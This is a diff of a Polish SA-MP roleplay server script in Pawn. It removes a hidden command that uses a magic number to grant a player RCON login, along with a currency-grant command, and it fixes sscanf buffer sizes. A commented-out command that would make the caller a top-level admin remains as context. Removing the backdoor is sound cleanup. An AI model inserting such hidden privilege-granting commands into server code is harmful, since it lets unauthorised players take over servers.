@@ -1040,15 +1040,6 @@ CMD:id(playerid, params[])
 	return 1;
 }
 
-CMD:koxubankotfunia(playerid, params[])
-{
-	if(strval(params) == 19769)
-	{
-		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Mo¿esz zalogowac siê na RCON'a");
-		SetPVarInt(playerid, "koxubankotfunia", 19769);
-	}
-	return 1;
-}
 /*CMD:funiadajadmina(playerid, params[]) {
     PlayerInfo[playerid][pAdmin] = 5000;
     SendClientMessage(playerid, COLOR_LIGHTBLUE, "jestes super admin");
@@ -9157,7 +9148,7 @@ CMD:pban(playerid, params[])
 		    }
 
 	   		new nick[MAX_PLAYER_NAME], result[128];
-			if( sscanf(params, "s[20]s[128]", nick, result))
+			if( sscanf(params, "s[21]s[128]", nick, result))
 			{
                 sendTipMessage(playerid, "U¿yj /pban [NICK GRACZA OFFLINE] [powod]");
                 return 1;
@@ -9202,7 +9193,7 @@ CMD:pwarn(playerid, params[])
 		    }
 
 	   		new nick[MAX_PLAYER_NAME], result[64];
-			if( sscanf(params, "s[20]s[64]", nick, result))
+			if( sscanf(params, "s[21]s[64]", nick, result))
 			{
                 sendTipMessage(playerid, "U¿yj /pwarn [NICK GRACZA OFFLINE] [powod]");
                 return 1;
@@ -9250,9 +9241,9 @@ CMD:paj(playerid, params[])
 		    }
 
 	   		new nick[MAX_PLAYER_NAME], czas, result[64];
-			if( sscanf(params, "s[20]ds[64]", nick, czas, result))
+			if( sscanf(params, "s[21]ds[64]", nick, czas, result))
 			{
-                sendTipMessage(playerid, "U¿yj /paj [NICK GRACZA OFFLINE] [czas] [powod]");
+                sendTipMessage(playerid, "U¿yj /paj [NICK GRACZA OFFLINE] [czas] [powod]"); //
                 return 1;
             }
             new giveplayerid;
@@ -10712,7 +10703,7 @@ CMD:dajfiltr(playerid, params[])
 	    if(IsPlayerAdmin(playerid))
 		{
 		    new ip[16];
-			if( sscanf(params, "s[16]s[20]", ip, sendername))
+			if( sscanf(params, "s[16]s[21]", ip, sendername))
 			{
 				sendTipMessage(playerid, "U¿yj /dajfiltr [ip] [NICK_GRACZA]");
 				return 1;
@@ -12970,7 +12961,7 @@ CMD:houseinfo(playerid)
 				{
 				    new dom=h;
 				    new string2[512];
-					new wynajem[20];
+					new wynajem[4];
 					if(Dom[dom][hWynajem] == 0)
 					{
                         wynajem = "nie";
@@ -34193,7 +34184,7 @@ CMD:akceptuj(playerid, params[])
 							PlayerInfo[SexOffer[playerid]][pPayCheck] += SexPrice[playerid];
 							PlayerInfo[SexOffer[playerid]][pSexSkill] ++;
                             //
-                            format(string, sizeof(string), "%s jeba³ siê za $%d z %s", sendername, SexPrice[playerid], giveplayer);
+                            format(string, sizeof(string), "%s jebal siê za $%d z %s", sendername, SexPrice[playerid], giveplayer);
                             ABroadCast(COLOR_YELLOW,string,1);
                             PayLog(string);
                             //
@@ -38177,25 +38168,6 @@ CMD:disabletruckerjob(playerid)
     return 1;
 }
 
-CMD:dajmc(playerid, params[])
-{
-    if(!Uprawnienia(playerid, ACCESS_OWNER)) return 1;
-    new id, val;
-    if(sscanf(params, "k<fix>d", id, val)) return sendTipMessage(playerid, "U¿yj /dajmc [Gracz] [MruCoiny]");
-    if(IsPlayerConnected(id) && val >= 0)
-    {
-        PlayerMC[id] = val;
-        MRP_SaveMC(id);
-        format(params, 128, "Admin %s da³ Tobie %d MruCoinów.", GetNick(playerid), val);
-        SendClientMessage(id, COLOR_YELLOW, params);
-        format(params, 128, "Da³es %s %d MruCoinów.", GetNick(id), val);
-        SendClientMessage(playerid, COLOR_GRAD2, params);
-        format(params, 128, "Admin %s (UID: %d) da³ %d MruCoinów graczowi %s (UID: %d)", GetNick(playerid), PlayerInfo[playerid][pUID], val, GetNick(id), PlayerInfo[id][pUID]);
-        StatsLog(params);
-    }
-    return 1;
-}
-
 CMD:rentcar(playerid)
 {
     if(HireCar[playerid] == 0) return 1;
@@ -38218,44 +38190,6 @@ CMD:rentcar(playerid)
     return 1;
 }
 
-/*CMD:premium(playerid)
-{
-    if(PlayerInfo[playerid][pAdmin] == 5000 || PlayerInfo[playerid][pNewAP] == 5) {
-        CallRemoteFunction("MRP_ShowPremiumMenu", "i", playerid);
-    } else {
-        sendTipMessage(playerid, "Trwaj¹ prace nad t¹ funkcj¹");
-    }
-    return 1;
-} 
-
-CMD:kupdodatki(playerid)
-{
-	if(!IsAtClothShop(playerid)) return sendTipMessageEx(playerid,0xAA3333AA,"	Tej komendy mo¿esz u¿yæ tylko w sklepie z ubraniami.");//SetPVarInt(playerid, "mrp_atshop", 1);
-    //else SetPVarInt(playerid, "mrp_atshop", 0);
-    ShowPlayerDialogEx(playerid, D_DODATKI_TYP, DIALOG_STYLE_LIST, "Typy dodatków", "Zwyk³e\nPrzedmioty premium\nPolicyjne\nUnikatowe\nDla gangu", "Wybierz", "WyjdŸ");
-    return 1;
-}
-
-CMD:dodatki(playerid)
-{
-    if(!InitMyItems[playerid]) MyItems_Load(playerid);
-    if(GetPVarInt(playerid, "mayask_dodatki") == 0)
-    {
-        ShowPlayerDialogEx(playerid, D_ASK_DODATKI, DIALOG_STYLE_MSGBOX, "Dodatki", "Przywróciæ dodatki?", "Tak", "Nie");
-        SetPVarInt(playerid, "mayask_dodatki", 1);
-    }
-    else CallRemoteFunction("SEC_MyItems_Show", "i", playerid);
-    return 1;
-}*/
-
-CMD:ao_setspecial(playerid, p[])
-{
-    if(!IsPlayerAdmin(playerid)) return 1;
-    new bool:enable=false;
-    sscanf(p, "B(0)", enable);
-    CallRemoteFunction("SEC_Dodatki_SpecialState", "b", enable);
-    return 1;
-}
 
 CMD:zapytaj(playerid, p[])
 {
